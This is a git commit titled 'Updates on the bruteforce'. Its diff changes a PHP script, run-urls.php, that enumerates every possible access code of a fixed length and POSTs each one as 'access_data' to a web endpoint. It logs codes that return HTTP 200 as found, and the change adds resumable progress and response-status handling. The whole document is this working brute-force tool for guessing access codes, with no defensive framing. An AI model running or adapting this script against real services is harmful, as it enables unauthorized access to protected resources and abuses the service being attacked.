61b1c2045d84df941af383644101ad1f5bc449ef
ZioCain <micael.castelleits@gmail.com>
2021-01-11 09:20:24 +0100

    Updates on the bruteforce

--- run-urls.php
+++ run-urls.php
@@ -1,6 +1,6 @@
 <?php
 
-function postCurl($url, $data){
+function postCurl($url, $data, &$info){
   $ch=curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   //curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
@@ -13,6 +13,7 @@ function postCurl($url, $data){
   curl_setopt($ch, CURLOPT_TIMEOUT, 30);
   curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
   $o=curl_exec($ch);
+  $info = curl_getinfo($ch);
   curl_close($ch);
   return $o;
 }
@@ -26,23 +27,30 @@ $amount = pow($valCount, $length);
 echo "There are $amount possible combinations.\n";
 
 $good = fopen("good.lst", 'w');
+$weird = fopen("weird.lst", "w");
 
 echo "Starting to check URLs\n";
 
-$startFrom =
-//0;
-1718400;
+$startFrom = 0;
+if(file_exists("last")) $startFrom = trim(file_get_contents("last"));
 
 for($k=$startFrom; $k<$amount; ++$k){
+  file_put_contents("last", $k);
   $code = base_convert($k, 10, $valCount);
   if( strlen($code) < $length ) $code = str_pad ( $code, $length, '0', STR_PAD_LEFT );
   if( preg_match('/00|11|22|33|44|55|66|77|88|99|aa|bb|cc|dd|ee|ff|gg|hh|ii|jj|kk|ll|mm|nn|oo|pp|qq|rr|ss|tt|uu|vv|ww|xx|yy|zz/', $code)==1) continue;
   $perc = number_format( $k/$amount, 3 );
   echo "Testing $code - $k/$amount - $perc %\r";
-  $ret = json_decode( postCurl( $URI, '{"access_data":"'.$code.'"}') );
+  $ret = json_decode( postCurl( $URI, '{"access_data":"'.$code.'"}', $info) );
   if( !isset($ret->status_code) ){
-    echo "FOUND CODE: ".$code."                           \n";
-    fwrite($good, $code."\n");
+    echo "Resource returned status: ".$info['http_code']."\n";
+    if($info['http_code']==200){
+      echo "FOUND CODE: ".$code."                           \n";
+      fwrite($good, $code."\n");
+    }else{
+      fwrite($weird, $code."\n");
+    }
   }
 }
 fclose($good);
+fclose($weird);
